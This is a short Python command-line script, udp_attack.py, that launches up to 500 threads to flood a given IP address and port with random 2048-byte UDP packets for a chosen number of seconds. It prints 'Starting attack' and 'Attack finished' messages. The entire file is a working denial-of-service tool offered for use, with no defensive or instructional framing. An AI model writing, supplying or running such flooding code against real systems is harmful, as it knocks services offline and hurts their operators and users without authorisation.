import socket
import threading
import time
import random
import sys

def udp_flood(target_ip, target_port, duration):
    def flood_thread():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)  # Timeout avoid hang
        bytes = random._urandom(2048)  # Bigger payload
        packets_sent = 0
        while time.time() < start_time + duration:
            try:
                for _ in range(200):  # 200 packets burst
                    sock.sendto(bytes, (target_ip, target_port))
                    packets_sent += 1
                time.sleep(0.000005)  # 5 microseconds
            except Exception as e:
                print(f"Thread error: {e}")
                break
        print(f"Thread sent {packets_sent} packets")
        sock.close()

    global start_time
    start_time = time.time()
    threads = []
    for _ in range(min(4 * 125, 500)):  # 500 threads max
        t = threading.Thread(target=flood_thread)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage: python udp_attack.py <ip> <port> <seconds>")
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    print(f"Starting attack on {target_ip}:{target_port} for {duration} seconds...")
    udp_flood(target_ip, target_port, duration)
    print("Attack finished.")
